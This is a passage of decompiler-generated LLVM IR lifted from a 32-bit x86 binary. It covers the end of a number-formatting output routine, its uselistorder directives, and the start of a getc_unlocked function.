  br label %dec_label_pc_804e750

dec_label_pc_804e750:                             ; preds = %dec_label_pc_804e720, %dec_label_pc_804e735
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_804e735 ], [ %stack_var_-132, %dec_label_pc_804e720 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e770

dec_label_pc_804e754:                             ; preds = %dec_label_pc_804e710
  %v4_804e756 = icmp eq i1 %v1_804e70c, false
  br i1 %v4_804e756, label %dec_label_pc_804e761, label %dec_label_pc_804e758

dec_label_pc_804e758:                             ; preds = %dec_label_pc_804e754
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e75b

dec_label_pc_804e75b:                             ; preds = %dec_label_pc_804e6d7, %dec_label_pc_804e758
  %v0_804e7a373 = phi i32 [ %v1_804e767, %dec_label_pc_804e6d7 ], [ -1, %dec_label_pc_804e758 ]
  %v2_804e75b = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804e75b, i32* @ecx, align 4
  br label %dec_label_pc_804e770

dec_label_pc_804e761:                             ; preds = %dec_label_pc_804e754
  %v2_804e765 = add i32 %v1_804e6f4, %v1_804e767
  store i32 %v2_804e765, i32* %edi.global-to-local, align 4
  %v2_804e767 = sub i32 %v2_804e702, %v1_804e767
  store i32 %v2_804e767, i32* %edx.global-to-local, align 4
  %v2_804e769 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804e769, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e770

dec_label_pc_804e770:                             ; preds = %dec_label_pc_804e75b, %dec_label_pc_804e750, %dec_label_pc_804e761
  %v0_804e7a372 = phi i32 [ %v0_804e7a373, %dec_label_pc_804e75b ], [ -1, %dec_label_pc_804e750 ], [ -1, %dec_label_pc_804e761 ]
  %v0_804e78c = phi i32 [ %v2_804e75b, %dec_label_pc_804e75b ], [ %storemerge10, %dec_label_pc_804e750 ], [ %v2_804e769, %dec_label_pc_804e761 ]
  %v0_804e77d = phi i32 [ %v2_804e702, %dec_label_pc_804e75b ], [ 0, %dec_label_pc_804e750 ], [ %v2_804e767, %dec_label_pc_804e761 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_804e777 = inttoptr i32 %v1_804e3cf to i8*
  %v3_804e777 = load i8, i8* %v2_804e777, align 1
  %v4_804e777 = and i8 %v3_804e777, 16
  %v5_804e777 = icmp eq i8 %v4_804e777, 0
  %v1_804e77b = icmp eq i1 %v5_804e777, false
  br i1 %v1_804e77b, label %dec_label_pc_804e78c, label %dec_label_pc_804e77d

dec_label_pc_804e77d:                             ; preds = %dec_label_pc_804e770
  %v1_804e77d = icmp eq i32 %v0_804e77d, 0
  %v1_804e77f = icmp eq i1 %v1_804e77d, false
  br i1 %v1_804e77f, label %dec_label_pc_804e78c, label %dec_label_pc_804e781

dec_label_pc_804e781:                             ; preds = %dec_label_pc_804e77d
  br i1 %v12_804e5e5, label %dec_label_pc_804e7a3, label %dec_label_pc_804e788

dec_label_pc_804e788:                             ; preds = %dec_label_pc_804e781
  %v0_804e788 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_804e788, 1
  br i1 %tmp140, label %dec_label_pc_804e7a3, label %dec_label_pc_804e78c

dec_label_pc_804e78c:                             ; preds = %dec_label_pc_804e788, %dec_label_pc_804e77d, %dec_label_pc_804e770
  %v1_804e78c = inttoptr i32 %v0_804e78c to i32*
  store i32 112, i32* %v1_804e78c, align 4
  %v0_804e792 = load i32, i32* @ecx, align 4
  %v1_804e792 = add i32 %v0_804e792, 4
  %v2_804e792 = inttoptr i32 %v1_804e792 to i32*
  store i32 1, i32* %v2_804e792, align 4
  %v0_804e799 = load i32, i32* @ecx, align 4
  %v1_804e799 = add i32 %v0_804e799, 8
  %v2_804e799 = inttoptr i32 %v1_804e799 to i32*
  store i32 ptrtoint (i32* @global_var_8052aa0.397 to i32), i32* %v2_804e799, align 4
  %v0_804e7a0 = load i32, i32* @ecx, align 4
  %v1_804e7a0 = add i32 %v0_804e7a0, 12
  store i32 %v1_804e7a0, i32* @ecx, align 4
  %v0_804e7a3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e7a3

dec_label_pc_804e7a3:                             ; preds = %dec_label_pc_804e788, %dec_label_pc_804e781, %dec_label_pc_804e78c
  %v0_804e7a8 = phi i32 [ %v0_804e78c, %dec_label_pc_804e788 ], [ %v0_804e78c, %dec_label_pc_804e781 ], [ %v1_804e7a0, %dec_label_pc_804e78c ]
  %v0_804e7a3 = phi i32 [ %v0_804e7a372, %dec_label_pc_804e788 ], [ %v0_804e7a372, %dec_label_pc_804e781 ], [ %v0_804e7a3.pre, %dec_label_pc_804e78c ]
  %v1_804e7a3 = add i32 %v0_804e7a3, 1
  %v8_804e7a3 = icmp eq i32 %v1_804e7a3, 0
  store i32 %v1_804e7a3, i32* %ebx.global-to-local, align 4
  br i1 %v8_804e7a3, label %dec_label_pc_804e7bd, label %dec_label_pc_804e7a6

dec_label_pc_804e7a6:                             ; preds = %dec_label_pc_804e7a3
  store i32 %v1_804e7a3, i32* %eax.global-to-local, align 4
  %v1_804e7a8 = inttoptr i32 %v0_804e7a8 to i32*
  store i32 176, i32* %v1_804e7a8, align 4
  %v0_804e7ae = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7ae = sub i32 0, %v0_804e7ae
  store i32 %v1_804e7ae, i32* %eax.global-to-local, align 4
  %v1_804e7b0 = load i32, i32* @ecx, align 4
  %v2_804e7b0 = add i32 %v1_804e7b0, 4
  %v3_804e7b0 = inttoptr i32 %v2_804e7b0 to i32*
  store i32 %v1_804e7ae, i32* %v3_804e7b0, align 4
  %v0_804e7b3 = load i32, i32* @ecx, align 4
  %v1_804e7b3 = add i32 %v0_804e7b3, 8
  %v2_804e7b3 = inttoptr i32 %v1_804e7b3 to i32*
  store i32 ptrtoint (i32* @global_var_8052a93.396 to i32), i32* %v2_804e7b3, align 4
  %v0_804e7ba = load i32, i32* @ecx, align 4
  %v1_804e7ba = add i32 %v0_804e7ba, 12
  store i32 %v1_804e7ba, i32* @ecx, align 4
  br label %dec_label_pc_804e7bd

dec_label_pc_804e7bd:                             ; preds = %dec_label_pc_804e7a3, %dec_label_pc_804e7a6
  %v0_804e7c1 = phi i32 [ %v0_804e7a8, %dec_label_pc_804e7a3 ], [ %v1_804e7ba, %dec_label_pc_804e7a6 ]
  %v0_804e7bd = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7bd = icmp eq i32 %v0_804e7bd, 0
  br i1 %v1_804e7bd, label %dec_label_pc_804e7d0, label %dec_label_pc_804e7c1

dec_label_pc_804e7c1:                             ; preds = %dec_label_pc_804e7bd
  %v1_804e7c1 = inttoptr i32 %v0_804e7c1 to i32*
  store i32 112, i32* %v1_804e7c1, align 4
  %v0_804e7c7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7c7 = load i32, i32* @ecx, align 4
  %v2_804e7c7 = add i32 %v1_804e7c7, 4
  %v3_804e7c7 = inttoptr i32 %v2_804e7c7 to i32*
  store i32 %v0_804e7c7, i32* %v3_804e7c7, align 4
  %v0_804e7ca = load i32, i32* %edi.global-to-local, align 4
  %v1_804e7ca = load i32, i32* @ecx, align 4
  %v2_804e7ca = add i32 %v1_804e7ca, 8
  %v3_804e7ca = inttoptr i32 %v2_804e7ca to i32*
  store i32 %v0_804e7ca, i32* %v3_804e7ca, align 4
  %v0_804e7cd = load i32, i32* @ecx, align 4
  %v1_804e7cd = add i32 %v0_804e7cd, 12
  store i32 %v1_804e7cd, i32* @ecx, align 4
  br label %dec_label_pc_804e7d0

dec_label_pc_804e7d0:                             ; preds = %dec_label_pc_804e7bd, %dec_label_pc_804e7c1
  %v0_804e7ee = phi i32 [ %v0_804e7c1, %dec_label_pc_804e7bd ], [ %v1_804e7cd, %dec_label_pc_804e7c1 ]
  br i1 %v1_804e5ea, label %dec_label_pc_804e7e4, label %dec_label_pc_804e7d7

dec_label_pc_804e7d7:                             ; preds = %dec_label_pc_804e7d0
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_804e7de = load i8, i8* %v2_804e777, align 1
  %v4_804e7de = and i8 %v3_804e7de, 16
  %v5_804e7de = icmp eq i8 %v4_804e7de, 0
  br i1 %v5_804e7de, label %dec_label_pc_804e801, label %dec_label_pc_804e7e4

dec_label_pc_804e7e4:                             ; preds = %dec_label_pc_804e7d7, %dec_label_pc_804e7d0
  %v0_804e7e4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7e6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7e6 = sub i32 %v0_804e7e4, %v1_804e7e6
  store i32 %v2_804e7e6, i32* %eax.global-to-local, align 4
  %v1_804e7e8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e7e8 = sub i32 %v2_804e7e6, %v1_804e7e8
  %v8_804e7e8 = xor i32 %v1_804e7e8, %v2_804e7e6
  %v9_804e7e8 = xor i32 %v2_804e7e8, %v2_804e7e6
  %v10_804e7e8 = and i32 %v9_804e7e8, %v8_804e7e8
  %v11_804e7e8 = icmp slt i32 %v10_804e7e8, 0
  %v13_804e7e8 = icmp slt i32 %v2_804e7e8, 0
  %v2_804e7ea = icmp eq i1 %v13_804e7e8, %v11_804e7e8
  br i1 %v2_804e7ea, label %dec_label_pc_804e801, label %dec_label_pc_804e7ec

dec_label_pc_804e7ec:                             ; preds = %dec_label_pc_804e7e4
  %v2_804e7ec = sub i32 %v1_804e7e8, %v2_804e7e6
  store i32 %v2_804e7ec, i32* %ebp.global-to-local, align 4
  %v1_804e7ee = inttoptr i32 %v0_804e7ee to i32*
  store i32 176, i32* %v1_804e7ee, align 4
  %v0_804e7f4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e7f4 = load i32, i32* @ecx, align 4
  %v2_804e7f4 = add i32 %v1_804e7f4, 4
  %v3_804e7f4 = inttoptr i32 %v2_804e7f4 to i32*
  store i32 %v0_804e7f4, i32* %v3_804e7f4, align 4
  %v0_804e7f7 = load i32, i32* @ecx, align 4
  %v1_804e7f7 = add i32 %v0_804e7f7, 8
  %v2_804e7f7 = inttoptr i32 %v1_804e7f7 to i32*
  store i32 ptrtoint (i32* @global_var_8052a93.396 to i32), i32* %v2_804e7f7, align 4
  %v0_804e7fe = load i32, i32* @ecx, align 4
  %v1_804e7fe = add i32 %v0_804e7fe, 12
  store i32 %v1_804e7fe, i32* @ecx, align 4
  br label %dec_label_pc_804e801

dec_label_pc_804e801:                             ; preds = %dec_label_pc_804e7e4, %dec_label_pc_804e7d7, %dec_label_pc_804e7ec
  %v1_804e88484 = phi i32 [ %v0_804e7ee, %dec_label_pc_804e7e4 ], [ %v0_804e7ee, %dec_label_pc_804e7d7 ], [ %v1_804e7fe, %dec_label_pc_804e7ec ]
  %v12_804e801 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_804e801, label %dec_label_pc_804e877, label %dec_label_pc_804e808

dec_label_pc_804e808:                             ; preds = %dec_label_pc_804e801
  %v0_804e80f = load i32, i32* %esi.global-to-local, align 4
  %v2_804e80f = icmp slt i32 %v0_804e80f, 0
  %v1_804e811 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_804e80f, i32* %edx.global-to-local, align 4
  br i1 %v2_804e80f, label %dec_label_pc_804e820, label %dec_label_pc_804e817

dec_label_pc_804e817:                             ; preds = %dec_label_pc_804e808
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e829

dec_label_pc_804e820:                             ; preds = %dec_label_pc_804e808
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_804e827 = sub i32 0, %v0_804e80f
  store i32 %v1_804e827, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e829

dec_label_pc_804e829:                             ; preds = %dec_label_pc_804e817, %dec_label_pc_804e820
  %v0_804e83d77 = phi i32 [ %v0_804e80f, %dec_label_pc_804e817 ], [ %v1_804e827, %dec_label_pc_804e820 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_804e831 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_804e831, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e83d

dec_label_pc_804e83d:                             ; preds = %dec_label_pc_804e83d.backedge, %dec_label_pc_804e829
  %v0_804e84b = phi i32 [ %v0_804e84e, %dec_label_pc_804e83d.backedge ], [ 2, %dec_label_pc_804e829 ]
  %v0_804e847 = phi i32 [ %v0_804e847.pre, %dec_label_pc_804e83d.backedge ], [ %v2_804e831, %dec_label_pc_804e829 ]
  %v0_804e83d = phi i32 [ %v9_804e845, %dec_label_pc_804e83d.backedge ], [ %v0_804e83d77, %dec_label_pc_804e829 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_804e844 = ashr i32 %v0_804e83d, 31
  %v2_804e845 = zext i32 %v0_804e83d to i64
  %v4_804e845 = zext i32 %v1_804e844 to i64
  %v5_804e845 = mul nuw i64 %v4_804e845, 4294967296
  %v6_804e845 = or i64 %v5_804e845, %v2_804e845
  %v8_804e845 = sdiv i64 %v6_804e845, 10
  %v9_804e845 = trunc i64 %v8_804e845 to i32
  store i32 %v9_804e845, i32* %eax.global-to-local, align 4
  %v11_804e845 = srem i64 %v6_804e845, 10
  %v12_804e845 = trunc i64 %v11_804e845 to i8
  %v1_804e847 = add i32 %v0_804e847, -1
  store i32 %v1_804e847, i32* %ebx.global-to-local, align 4
  %v1_804e848 = add i8 %v12_804e845, 48
  %v1_804e84b = add i32 %v0_804e84b, 1
  store i32 %v1_804e84b, i32* %esi.global-to-local, align 4
  %v3_804e84c = inttoptr i32 %v1_804e847 to i8*
  store i8 %v1_804e848, i8* %v3_804e84c, align 1
  %v0_804e84e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_804e845, i32* %edx.global-to-local, align 4
  %v7_804e853 = icmp sgt i32 %v0_804e84e, 3
  br i1 %v7_804e853, label %dec_label_pc_804e855, label %dec_label_pc_804e83d.backedge

dec_label_pc_804e855:                             ; preds = %dec_label_pc_804e83d
  %v2_804e855 = icmp eq i32 %v9_804e845, 0
  %v1_804e857 = icmp eq i1 %v2_804e855, false
  br i1 %v1_804e857, label %dec_label_pc_804e83d.backedge, label %dec_label_pc_804e859

dec_label_pc_804e83d.backedge:                    ; preds = %dec_label_pc_804e855, %dec_label_pc_804e83d
  %v0_804e847.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e83d

dec_label_pc_804e859:                             ; preds = %dec_label_pc_804e855
  %v0_804e859 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804e859, i32* %edx.global-to-local, align 4
  %v0_804e85b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e85b = add i32 %v0_804e85b, -2
  store i32 %v1_804e85b, i32* %eax.global-to-local, align 4
  %v1_804e85e = trunc i32 %v0_804e859 to i8
  %v3_804e85e = add i32 %v0_804e85b, -1
  %v4_804e85e = inttoptr i32 %v3_804e85e to i8*
  store i8 %v1_804e85e, i8* %v4_804e85e, align 1
  %v5_804e861 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e861 = and i32 %v5_804e861, -256
  %v7_804e861 = or i32 %v6_804e861, %stack_var_-42.0
  store i32 %v7_804e861, i32* %edx.global-to-local, align 4
  %v2_804e865 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e865 = add i32 %v2_804e865, -2
  %v4_804e865 = inttoptr i32 %v3_804e865 to i8*
  store i8 %v1_804e811, i8* %v4_804e865, align 1
  %v0_804e868 = load i32, i32* @ecx, align 4
  %v1_804e868 = inttoptr i32 %v0_804e868 to i32*
  store i32 112, i32* %v1_804e868, align 4
  %v0_804e86e = load i32, i32* %esi.global-to-local, align 4
  %v1_804e86e = load i32, i32* @ecx, align 4
  %v2_804e86e = add i32 %v1_804e86e, 4
  %v3_804e86e = inttoptr i32 %v2_804e86e to i32*
  store i32 %v0_804e86e, i32* %v3_804e86e, align 4
  %v0_804e871 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e871 = load i32, i32* @ecx, align 4
  %v2_804e871 = add i32 %v1_804e871, 8
  %v3_804e871 = inttoptr i32 %v2_804e871 to i32*
  store i32 %v0_804e871, i32* %v3_804e871, align 4
  %v0_804e874 = load i32, i32* @ecx, align 4
  %v1_804e874 = add i32 %v0_804e874, 12
  store i32 %v1_804e874, i32* @ecx, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e877:                             ; preds = %dec_label_pc_804e801, %dec_label_pc_804e49c, %dec_label_pc_804e859
  %v0_804e8f8 = phi i32 [ %v1_804e88484, %dec_label_pc_804e801 ], [ %v2_804e4a4, %dec_label_pc_804e49c ], [ %v1_804e874, %dec_label_pc_804e859 ]
  %v2_804e877 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804e877, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e87b

dec_label_pc_804e87b:                             ; preds = %dec_label_pc_804e87b, %dec_label_pc_804e877
  %v0_804e87b = phi i32 [ %v2_804e877, %dec_label_pc_804e877 ], [ %v1_804e87d, %dec_label_pc_804e87b ]
  %stack_var_-216.0 = phi i32 [ %v3_804e38f, %dec_label_pc_804e877 ], [ %v5_804e880, %dec_label_pc_804e87b ]
  %v1_804e87b = inttoptr i32 %v0_804e87b to i32*
  %v2_804e87b = load i32, i32* %v1_804e87b, align 4
  store i32 %v2_804e87b, i32* %edx.global-to-local, align 4
  %v1_804e87d = add i32 %v0_804e87b, 12
  store i32 %v1_804e87d, i32* %eax.global-to-local, align 4
  %v5_804e880 = sub i32 %stack_var_-216.0, %v2_804e87b
  %v7_804e884 = icmp ult i32 %v1_804e87d, %v0_804e8f8
  br i1 %v7_804e884, label %dec_label_pc_804e87b, label %dec_label_pc_804e888

dec_label_pc_804e888:                             ; preds = %dec_label_pc_804e87b
  %v5_804e891 = icmp eq i8 %stack_var_-26.0, 0
  %v1_804e8a1 = icmp eq i1 %v5_804e891, false
  %v2_804e8a1 = zext i1 %v1_804e8a1 to i32
  %v2_804e8a4 = sub i32 %v5_804e880, %v2_804e8a1
  store i32 %v2_804e8a4, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_804e8a4, i32* %eax.global-to-local, align 4
  store i32 %v0_804e8f8, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_804e8a4, 1
  br i1 %tmp141, label %dec_label_pc_804e8fa, label %dec_label_pc_804e8ba

dec_label_pc_804e8ba:                             ; preds = %dec_label_pc_804e888
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_804e8c1 = inttoptr i32 %v1_804e3cf to i8*
  %v3_804e8c1 = load i8, i8* %v2_804e8c1, align 1
  %v4_804e8c1 = and i8 %v3_804e8c1, 8
  %v5_804e8c1 = icmp eq i8 %v4_804e8c1, 0
  br i1 %v5_804e8c1, label %dec_label_pc_804e8dc, label %dec_label_pc_804e8c7

dec_label_pc_804e8c7:                             ; preds = %dec_label_pc_804e8ba
  %v1_804e8c7 = add i32 %v0_804e8f8, 12
  store i32 %v1_804e8c7, i32* %esi.global-to-local, align 4
  %v1_804e8ca = inttoptr i32 %v0_804e8f8 to i32*
  store i32 160, i32* %v1_804e8ca, align 4
  %v0_804e8d0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8d0 = load i32, i32* @ecx, align 4
  %v2_804e8d0 = add i32 %v1_804e8d0, 4
  %v3_804e8d0 = inttoptr i32 %v2_804e8d0 to i32*
  store i32 %v0_804e8d0, i32* %v3_804e8d0, align 4
  %v0_804e8d3 = load i32, i32* @ecx, align 4
  %v1_804e8d3 = add i32 %v0_804e8d3, 8
  %v2_804e8d3 = inttoptr i32 %v1_804e8d3 to i32*
  store i32 ptrtoint (i32* @global_var_8052a93.396 to i32), i32* %v2_804e8d3, align 4
  br label %dec_label_pc_804e8fa

dec_label_pc_804e8dc:                             ; preds = %dec_label_pc_804e8ba
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804e8e3 = add i32 %tmp112, 16
  %v2_804e8e3 = inttoptr i32 %v1_804e8e3 to i32*
  %v3_804e8e3 = load i32, i32* %v2_804e8e3, align 4
  %v9_804e8e3 = icmp eq i32 %v3_804e8e3, 48
  %v1_804e8e7 = icmp eq i1 %v9_804e8e3, false
  br i1 %v1_804e8e7, label %dec_label_pc_804e8f4, label %dec_label_pc_804e8e9

dec_label_pc_804e8e9:                             ; preds = %dec_label_pc_804e8dc
  %v3_804e8e9 = load i32, i32* %stack_var_-152, align 4
  %v5_804e8e9 = add i32 %v3_804e8e9, %v2_804e8a4
  store i32 %v5_804e8e9, i32* %stack_var_-152, align 4
  br label %dec_label_pc_804e8f8

dec_label_pc_804e8ef:                             ; preds = %dec_label_pc_804e900
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e927

dec_label_pc_804e8f4:                             ; preds = %dec_label_pc_804e8dc
  br label %dec_label_pc_804e8f8

dec_label_pc_804e8f8:                             ; preds = %dec_label_pc_804e8e9, %dec_label_pc_804e8f4
  store i32 %v0_804e8f8, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e8fa

dec_label_pc_804e8fa:                             ; preds = %dec_label_pc_804e888, %dec_label_pc_804e8c7, %dec_label_pc_804e8f8
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804e8fc = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804e8fc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e900

dec_label_pc_804e900:                             ; preds = %dec_label_pc_804e91e, %dec_label_pc_804e8fa
  call void @__pseudo_call(i32 %tmp112)
  %v0_804e919 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e919 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e919 = add i32 %v1_804e919, 4
  %v3_804e919 = inttoptr i32 %v2_804e919 to i32*
  %v4_804e919 = load i32, i32* %v3_804e919, align 4
  %v15_804e919 = icmp eq i32 %v0_804e919, %v4_804e919
  %v1_804e91c = icmp eq i1 %v15_804e919, false
  br i1 %v1_804e91c, label %dec_label_pc_804e8ef, label %dec_label_pc_804e91e

dec_label_pc_804e91e:                             ; preds = %dec_label_pc_804e900
  %v1_804e91e = add i32 %v1_804e919, 12
  store i32 %v1_804e91e, i32* %ebx.global-to-local, align 4
  %v0_804e921 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e921 = add i32 %v0_804e921, %v0_804e919
  store i32 %v2_804e921, i32* %edi.global-to-local, align 4
  %v1_804e923 = load i32, i32* %esi.global-to-local, align 4
  %v7_804e923 = icmp ult i32 %v1_804e91e, %v1_804e923
  br i1 %v7_804e923, label %dec_label_pc_804e900, label %dec_label_pc_804e927

dec_label_pc_804e927:                             ; preds = %dec_label_pc_804e91e, %dec_label_pc_804e8ef
  %v0_804e92d = phi i32 [ -1, %dec_label_pc_804e8ef ], [ %v2_804e921, %dec_label_pc_804e91e ]
  store i32 %v0_804e92d, i32* %eax.global-to-local, align 4
  %v2_804e930 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e930, i32* @esi, align 4
  store i32 %v0_804e372, i32* @edi, align 4
  store i32 %v0_804e371, i32* @ebp, align 4
  ret i32 %v0_804e92d

; uselistorder directives
  uselistorder i32 %v0_804e92d, { 1, 0 }
  uselistorder i32 %v1_804e87d, { 1, 2, 0 }
  uselistorder i32 %v0_804e87b, { 1, 0 }
  uselistorder i32 %v0_804e8f8, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_804e84e, { 1, 0 }
  uselistorder i32 %v9_804e845, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804e83d, { 1, 0 }
  uselistorder i32 %v0_804e80f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e7e8, { 1, 0 }
  uselistorder i32 %v1_804e7e8, { 1, 0, 2 }
  uselistorder i32 %v2_804e7e6, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804e71c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804e702, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804e767, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_804e6cd, { 0, 2, 1 }
  uselistorder i32 %v1_804e6a6, { 1, 0 }
  uselistorder i32 %v0_804e6a1, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804e66e, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804e669, { 1, 0 }
  uselistorder i8 %v2_804e662, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804e662, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804e5ec, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_804e5d1, { 1, 0 }
  uselistorder i32 %v1_804e5bd, { 1, 0 }
  uselistorder i32 %v0_804e5b1, { 1, 0 }
  uselistorder i32 %v4_804e598, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804e59d, { 1, 0 }
  uselistorder i32 %v2_804e55b, { 1, 0, 2 }
  uselistorder i3 %v1_804e411, { 1, 0 }
  uselistorder i8 %v4_804e490, { 1, 0 }
  uselistorder i32 %v3_804e3cf, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_804e3cf, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_804e3a1, { 1, 0 }
  uselistorder i32 %v3_804e38f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder x86_fp80* %st0.global-to-local, { 1, 2, 3, 0 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 10, 9, 11, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 0, 15, 16, 13, 20, 17, 18, 19, 21, 22, 23, 24 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e8fa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e8f8, { 1, 0 }
  uselistorder label %dec_label_pc_804e877, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e829, { 1, 0 }
  uselistorder label %dec_label_pc_804e801, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e7d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e7bd, { 1, 0 }
  uselistorder label %dec_label_pc_804e7a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e75b, { 1, 0 }
  uselistorder label %dec_label_pc_804e750, { 1, 0 }
  uselistorder label %dec_label_pc_804e6d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e6c9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e68f, { 1, 0 }
  uselistorder label %dec_label_pc_804e65f.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804e62b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e5fa, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e5e5, { 1, 0 }
  uselistorder label %dec_label_pc_804e49c, { 1, 0 }
  uselistorder label %dec_label_pc_804e3c0, { 1, 0 }
  uselistorder label %dec_label_pc_804e3b7, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_4()
  %stack_var_-5 = alloca i8, align 1
  %v0_804e934 = load i32, i32* @ebx, align 4
  %v4_804e938 = ptrtoint i16* %tmp to i32
  store i32 %v4_804e938, i32* @ebx, align 4
  %v1_804e93c = add i32 %v4_804e938, 16
  %v2_804e93c = inttoptr i32 %v1_804e93c to i32*
  %v3_804e93c = load i32, i32* %v2_804e93c, align 4
